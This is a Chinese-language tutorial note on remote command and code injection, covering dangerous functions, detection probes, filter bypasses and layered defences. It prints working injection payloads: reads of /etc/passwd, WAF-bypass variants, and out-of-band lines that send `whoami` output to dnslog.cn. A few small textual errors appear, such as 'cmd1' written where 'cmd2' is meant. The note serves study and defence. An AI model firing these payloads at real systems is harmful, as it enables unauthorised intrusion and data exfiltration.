# 2026-08-05 RCE 远程代码/命令执行漏洞详解

## 知识框架速览

```mermaid
mindmap
  root((RCE 远程代码命令执行))
    命令执行 Command Injection
      原理
        用户输入拼入系统命令
        分隔符接上自己的命令
      拼接符号
        Linux ; | || && & `` $()
        Windows & && || |
      危险函数
        PHP system exec shell_exec passthru popen
        Python os.system os.popen subprocess
        Java Runtime.exec ProcessBuilder
      存在位置
        ping traceroute nslookup
        压缩解压 图片处理
        邮件 sendmail
        备份 mysqldump tar
        插件 Apache Nifi Webmin
    代码执行 Code Injection
      原理
        用户输入直接当代码执行
        eval assert 等危险函数
      危险函数
        PHP eval assert preg_replace /e create_function
        Python eval exec __import__ pickle.loads
        Java OGNL SpEL MVEL 表达式注入
      存在位置
        模板引擎 SSTI
        CMS 插件 主题编辑器
        在线运行代码 沙箱
        反序列化 unserialize pickle
        数据库存储过程 xp_cmdshell
    检测方法
      白盒
        搜索危险函数
        参数污点追踪
        Semgrep CodeQL
      黑盒
        延时探测 sleep ping -c
        回显探测 id whoami
        外带探测 DNSLog curl nslookup
      代码执行探测
        数学运算 1+1 print abs -1
        phpinfo
        延时 sleep 5
    绕过手法
      空格绕过
        ${IFS} $IFS$9 %09 < <>
      关键词绕过
        cat more less head tail tac
        c\at /bin/c?t ca''t
      分隔符绕过
        %0a换行 %0d%0a
      编码混淆
        base64 chr 拼接 异或
    安全修复
      代码层
        白名单映射
        escapeshellarg
        不用eval assert
      配置层
        disable_functions
        open_basedir
      运行时
        容器沙箱
        最小权限
        seccomp AppArmor
        网络隔离 限出口IP
      监控
        异常命令检测
        进程行为审计
```

---

## 一、先分清两兄弟

RCE 是统称，包含两种：

| | 命令执行（Command Injection） | 代码执行（Code Injection） |
|------|------|------|
| **注入什么** | 操作系统命令（`whoami`、`ls`、`cat`） | 编程语言代码（PHP、Python、Java） |
| **在哪执行** | 服务器 Shell（bash/cmd） | 语言解释器内 |
| **危险函数** | `system()` `exec()` `shell_exec()` `popen()` `` `` | `eval()` `assert()` `preg_replace()/e` `create_function()` |
| **一句话** | 你让服务器帮你敲命令 | 你让服务器帮你跑代码 |

```
命令执行：system('whoami')     → 服务器 Shell 执行 whoami
代码执行：eval('echo "hi";')   → PHP 解释器执行代码
```

---

## 二、命令执行（Command Injection）

### 2.1 原理

用户输入被拼入系统命令中执行：

```php
// ❌ 有漏洞的代码
$ip = $_GET['ip'];
system("ping -c 3 " . $ip);
```

```
正常：?ip=127.0.0.1      → ping -c 3 127.0.0.1 ✅
攻击：?ip=127.0.0.1;id   → ping -c 3 127.0.0.1;id 💥
       第二个命令 id 也被执行了！
```

### 2.2 拼接符号（关键！）

命令执行的核心就是**怎么接上你自己的命令**。

**Linux**：

| 符号 | 写法 | 效果 |
|------|------|------|
| `;` | `cmd1;cmd2` | 顺序执行，不管 cmd1 结果 |
| `\|` | `cmd1 \| cmd2` | 管道，cmd1 输出作为 cmd2 输入 |
| `\|\|` | `cmd1 \|\| cmd2` | cmd1 失败才执行 cmd2 |
| `&&` | `cmd1 && cmd2` | cmd1 成功才执行 cmd1 |
| `&` | `cmd1 & cmd2` | 后台执行 cmd1，同时执行 cmd2 |
| `` ` `` | `echo \`id\`` | 命令替换，先执行反引号里的 |
| `$()` | `echo $(id)` | 命令替换，同上 |

**Windows (cmd)**：

| 符号 | 写法 | 效果 |
|------|------|------|
| `&` | `cmd1 & cmd2` | 顺序执行 |
| `&&` | `cmd1 && cmd2` | cmd1 成功才执行 cmd1 |
| `\|\|` | `cmd1 \|\| cmd2` | cmd1 失败才执行 cmd2 |
| `\|` | `cmd1 \| cmd2` | 管道 |

> Linux 里 `;` 是最常用的命令分隔符，Windows 里是 `&`。

### 2.3 常见危险函数

**PHP**：

| 函数 | 说明 |
|------|------|
| `system()` | 执行命令 + 直接输出结果 |
| `exec()` | 执行命令 + 返回最后一行 |
| `shell_exec()` | 执行命令 + 返回全部输出 |
| `passthru()` | 执行命令 + 直接输出二进制 |
| `popen()` | 打开进程管道 |
| `` ` ``（反引号） | 等于 `shell_exec()` |

**Python**：

| 函数 | 说明 |
|------|------|
| `os.system()` | 执行命令 |
| `os.popen()` | 执行命令并读取输出 |
| `subprocess.call()` | 执行命令 |
| `subprocess.Popen()` | 执行命令（更底层） |

### 2.4 存在位置

```
- 网络工具功能：ping / traceroute / nslookup / whois 查询
- 文件操作：压缩/解压、图片处理（ImageMagick）
- 系统管理：定时任务、服务重启、日志查看
- 邮件功能：sendmail
- 备份功能：mysqldump / tar
- 插件/组件：Apache Nifi、Webmin、各种 CMS 后台工具
```

---

## 三、代码执行（Code Injection）

### 3.1 原理

用户输入被直接作为代码执行：

```php
// ❌ 有漏洞的代码
$code = $_GET['code'];
eval($code);
```

```
正常：?code=echo 'hello';     → eval("echo 'hello';") ✅
攻击：?code=system('whoami'); → eval("system('whoami');") 💥
```

### 3.2 常见危险函数

**PHP**：

| 函数 | 说明 |
|------|------|
| `eval()` | ⭐ 最经典的代码执行函数 |
| `assert()` | 和 `eval` 类似（PHP 7.2 后行为变化） |
| `preg_replace()` + `/e` 修饰符 | ⭐ 正则替换执行代码（PHP 5.5 废弃） |
| `create_function()` | 动态创建函数（PHP 7.2 废弃） |
| `call_user_func()` / `call_user_func_array()` | 回调函数执行 |
| `array_map()` / `array_filter()` | 数组回调执行 |
| `${}` 变量变量 | `echo ${$_GET['var']}` |
| `include()` / `require()` | 文件包含也能执行代码（见 LFI 笔记） |

**Python**：

| 函数 | 说明 |
|------|------|
| `eval()` | ⭐ Python 表达式求值 |
| `exec()` | 执行 Python 代码块 |
| `__import__()` | 动态导入模块 |
| `pickle.loads()` | 反序列化代码执行 |

**Java**：

| 函数 | 说明 |
|------|------|
| `Runtime.getRuntime().exec()` | 命令执行 |
| `ProcessBuilder` | 进始化管理 |
| 表达式注入（OGNL/SpEL/MVEL） | 模板/框架中的表达式注入 |
| `javax.script.ScriptEngine` | JavaScript 引擎执行（Nashorn） |

### 3.3 存在位置

```
- 模板引擎：Smarty / Twig / FreeMarker / Thymeleaf（服务端模板注入 SSTI）
- CMS 插件/主题编辑器（WordPress 主题编辑写 PHP）
- "在线运行代码"功能（在线 PHP/Python 沙箱）
- 序列化/反序列化：PHP unserialize() / Python pickle
- 数据库存储过程（动态 SQL + EXEC / xp_cmdshell）
- 表达式注入：Struts2 OGNL / Spring SpEL
- 规则引擎/公式计算（用户输入表达式求值）
```

---

## 四、检测方法

### 4.1 命令执行检测

**白盒：搜索危险函数 + 参数污点追踪**

```
危险函数签名搜索：
  PHP: system( / exec( / shell_exec( / passthru( / popen( / `.*`
  Python: os.system( / os.popen( / subprocess
  Java: Runtime.getRuntime().exec( / ProcessBuilder

追参数来源：
  参数来自 $_GET / $_POST / $_COOKIE / 请求头 ？
  → 有 WAF 校验吗？  → 流到了危险函数吗？
```

**黑盒：延时标记探测（最便宜）**

```
?ip=127.0.0.1                        → 正常响应（基线）
?ip=127.0.0.1;sleep+5                → 延迟 5 秒 → 命令执行 ✅
?ip=127.0.0.1;ping+-c+5+127.0.0.1    → 延迟 → ✅
?ip=127.0.0.1|sleep+5                → 尝试不同分隔符
?ip=127.0.0.1||sleep+5               → 同上
?ip=127.0.0.1&&sleep+5               → 同上
```

> 💡 `sleep` 是最便宜的检测方式——不需要回显，只观察响应时间。

**回显检测**：

```
# Linux
?ip=127.0.0.1;id
?ip=127.0.0.1;cat /etc/passwd
?ip=127.0.0.1;uname -a

# Windows
?ip=127.0.0.1&whoami
?ip=127.0.0.1&type C:\Windows\win.ini
```

**外带检测（无回显时，OOB/DNSLog）**：

```
?ip=127.0.0.1;ping `whoami`.dnslog.cn
?ip=127.0.0.1;curl http://dnslog.cn/`whoami`
?ip=127.0.0.1;nslookup `hostname`.dnslog.cn
```

### 4.2 代码执行检测

**白盒：搜索代码执行函数**

```
PHP:  eval( / assert( / preg_replace(.*\/e / create_function(
Python: eval( / exec( / __import__( / pickle.loads(
Java:  ScriptEngine / OGNL.getValue( / SpelExpressionParser
```

**黑盒：数学运算探测**

```
?code=phpinfo();         → 有 phpinfo 输出 → 代码执行 ✅
?code=print(1+1);        → 返回 2 → 代码执行 ✅
?code=print(111*111);    → 返回 12321 → 代码执行 ✅

# 无回显时 → 时间盲注
?code=sleep(5);          → 延迟 5 秒 → 代码执行 ✅
?code=print(abs(-1));    → Java 表达式注入常用测试
```

---

## 五、绕过手法

### 5.1 命令执行绕过

**空格绕过**：

```
空格被过滤？
→ ${IFS}    : ?ip=127.0.0.1;cat${IFS}/etc/passwd
→ $IFS$9    : ?ip=127.0.0.1;cat$IFS$9/etc/passwd
→ %09 (Tab) : ?ip=127.0.0.1;cat%09/etc/passwd
→ <         : ?ip=127.0.0.1;cat</etc/passwd
→ <>        : ?ip=127.0.0.1;cat<>/etc/passwd
→ {}        : ?ip=127.0.0.1;{cat,/etc/passwd}
→ \x20      : (Hex 空格)
```

**关键词绕过**：

```
cat 被过滤？
→ more /etc/passwd
→ less /etc/passwd
→ head /etc/passwd
→ tail /etc/passwd
→ tac /etc/passwd       ← cat 反转，同样的内容
→ c\at /etc/passwd      ← Linux 反斜杠转义
→ /bin/c?t /etc/passwd  ← 通配符替代
→ ca''t /etc/passwd     ← 空字符串拼接
→ ca""t /etc/passwd     ← 同上
```

**管道符和对分隔符过滤**：

```
| 和 ; 被过滤？
→ %0a (换行)  : ?ip=127.0.0.1%0aid
→ %0d%0a (CRLF) : ?ip=127.0.0.1%0d%0aid
→ ||         : ?ip=||id
→ &&         : ?ip=&&id
→ $(cmd)     : ?ip=127.0.0.1$(id)
→ `cmd`       : ?ip=127.0.0.1`id`
```

**其他字符过滤**：

```
/ 被过滤？
→ ${HOME:0:1}          ← 用变量组合出 /
→ $(pwd | cut -c1)     ← 用命令输出组合出 /

. 被过滤？
→ 用 printf 或变量拼接构造文件名

";" 被过滤？
→ 用 %0a 换行符代替
```

### 5.2 代码执行绕过

```php
// 过滤了 eval / system / phpinfo ?
// 用字符串拼接 + 动态调用
$_GET['a']($_GET['b']);
// ?a=system&b=whoami
// → system('whoami')

// 过滤了引号？
// 用 chr() 拼字符串
${'s'.'y'.'s'.'t'.'e'.'m'}('whoami');

// 过滤了字母？
// 用 ^ 异或/XOR 构造（PHP）
${_GET}{_}(${_GET}{__});
// ?_=system&__=whoami
```

---

## 六、安全修复

### 6.1 命令执行的修复

```php
// ❌ 不要接受用户输入拼进命令
system("ping -c 3 " . $_GET['ip']);

// ✅ 方案 1：白名单映射
$allowed = ['ping', 'tracert'];
$cmd = $_GET['cmd'];
if (!in_array($cmd, $allowed)) die('Denied');
switch ($cmd) {
    case 'ping': system('ping -c 3 ' . escapeshellarg($_GET['ip'])); break;
    case 'tracert': system('tracert ' . escapeshellarg($_GET['ip'])); break;
}

// ✅ 方案 2：不要用 system()，用编程语言内建函数
// 例如要 ping → 用 PHP 的 socket 函数自己拼 ICMP 包
// 例如要处理图片 → 用 GD/Imagick 库，不要 exec('convert ...')

// ✅ 方案 3：必须用命令时，escapeshellarg() + 参数列表形式
$ip = escapeshellarg($_GET['ip']);  // 把整个参数引号包起来，防止注入
system("ping -c 3 $ip");
```

### 6.2 代码执行的修复

```php
// ❌ 最危险
eval($_GET['code']);
assert($_GET['code']);

// ✅ 不要用 eval/assert——用普通代码逻辑替代
// 比如实现"公式计算"功能，用专门的表达式解析库而不是 eval

// ✅ 用过术前的函数，参数必须硬编码
call_user_func('my_callback', $safe_arg);
// ❌ call_user_func($_GET['func'], $arg);  ← 函数名用户可控！
```

### 6.3 php.ini 加固

```ini
disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec,dl,eval,assert,create_function
open_basedir = /var/www/html
```

### 6.4 运行环境隔离

| 措施 | 效果 |
|------|------|
| **容器/沙箱** | 即使 RCE 也拿不到宿主机 |
| **最小权限** | Web 进程用 `www-data`，不能执行系统管理命令 |
| **read-only 文件系统** | cmd shell 目录不可写 |
| **Seccomp / AppArmor** | 限制可用的系统调用 |
| **网络隔离** | 限制出口 IP/域名（防止 OOB DNSLog 外带） |

### 6.5 防御分层

```
第 1 层：代码层 — 不使用危险函数，或用白名单 + escapeshellarg
第 2 层：php.ini / 容器配置 — disable_functions + open_basedir
第 3 层：WAF/RASP — 拦截 ping / id / whoami 等探测命令
第 4 层：系统权限 — 最小权限 + 文件只读 + seccomp
第 5 层：监控告警 — 异常命令/进程检测 + 日志审计
```

---

## 七、总结

| 维度 | 命令执行 | 代码执行 |
|------|---------|---------|
| **注入位置** | 系统命令拼接点 | 语言代码拼接点 |
| **关键函数** | `system()` `exec()` `popen()` | `eval()` `assert()` `create_function()` |
| **分隔拼接** | `;` `\|` `&&` `\|\|` `$()` `` ` `` | `?a=system&b=whoami` 等动态调用 |
| **检测方式** | `sleep` 延时探测 / DNSLog 外带 | `phpinfo()` / 数学运算 / 延时 |
| **绕过核心** | 换分隔符、换空白、编码、通配符 | 字符串拼接、变量变量、回调函数 |
| **防御核心** | 白名单 + `escapeshellarg` | **不使用 eval/assert**，用代码逻辑替代 |
| **关联漏洞** | 文件包含 getshell、反序列化 getshell | SSTI（模板注入）、SQL 注入 xp_cmdshell |

### 一句话记忆

> **命令执行 = 替服务器敲命令，代码执行 = 让服务器帮你跑代码。** 都是把用户的输入当成了"指令"来运行——和 SQL 注入、XSS 的道理一脉相承：**数据和代码混淆了。**

### 关联笔记

- [文件包含漏洞详解](./2026-08-05-文件包含漏洞详解.md) — LFI + 日志投毒 → RCE
- [文件上传漏洞体系总览](./2026-07-31-文件上传漏洞.md) — 文件上传 → Webshell → RCE
- [SQL 注入基础](./2026-07-26-SQL注入基础.md) — SQL 注入 xp_cmdshell → RCE
- [CSRF 与 SSRF 漏洞详解](./2026-08-04-CSRF与SSRF漏洞详解.md) — SSRF + Gopher → Redis → RCE

> ⚠️ 声明：以上技术仅用于授权靶场和渗透测试授权目标，未经授权使用属于违法行为。
